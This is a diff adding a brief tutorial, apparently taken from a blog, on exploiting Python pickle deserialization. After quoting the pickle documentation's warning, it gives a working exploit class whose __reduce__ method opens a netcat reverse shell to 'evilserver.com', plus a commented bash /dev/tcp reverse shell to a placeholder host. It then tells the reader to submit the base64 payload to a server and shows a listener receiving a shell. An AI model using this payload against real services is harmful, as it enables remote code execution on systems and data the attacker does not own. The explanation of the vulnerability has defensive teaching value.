@@ -1,0 +1,52 @@
+https://root4loot.com/post/exploiting_cpickle/
+
+Pickle Arbitrary Code Execution
+=======================================
+
+The pickle module is not secure against erroneous or maliciously constructed data.
+
+Pickle is a serialization/deserialization module found within the standard Python library.
+For those unfamiliar with serialization and deserialization; it is a way of converting objects
+and data structures to files or databases so that they can be reconstructed later
+(possibly in a different environment). This process is called serialization and deserialization,
+but in Python, it is called pickling and unpickling. One big caveat to pickle however,
+is that it does not perform any “security checking” on the data that is being unpickled,
+meaning that an attacker having access to the endpoint can potentially gain remote code execution
+by serving malicious input. It is therefore important to use pickle only when you have a trusted relationship between partners.
+
+From the Pickle documentation:
+
+Warning The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
+
+-----
+
+Pickling objects is pretty straightforward. In the following example we import os to self,
+allowing us to execute commands. In this case we pop a reverse connection from /bin/sh.
+
+---
+#
+# alertnate reverse shell
+# bash -i >& /dev/tcp/evil.server.ip.addr/443 0>&1
+#
+import cPickle
+import base64
+
+class Exploit(object):
+    def __reduce__(self):
+        import os
+        s = "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc evilserver.com 443 > /tmp/f"
+        return (os.popen, (s,))
+
+print base64.b64encode(cPickle.dumps(Exploit()))
+
+---
+
+Pass the Base64 encode output it to the server (POST/GET var, json data value, etc...)
+
+$ nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.10] 52904
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1002(alice) gid=1002(alice) groups=1002(alice),4(adm),27(sudo)
+
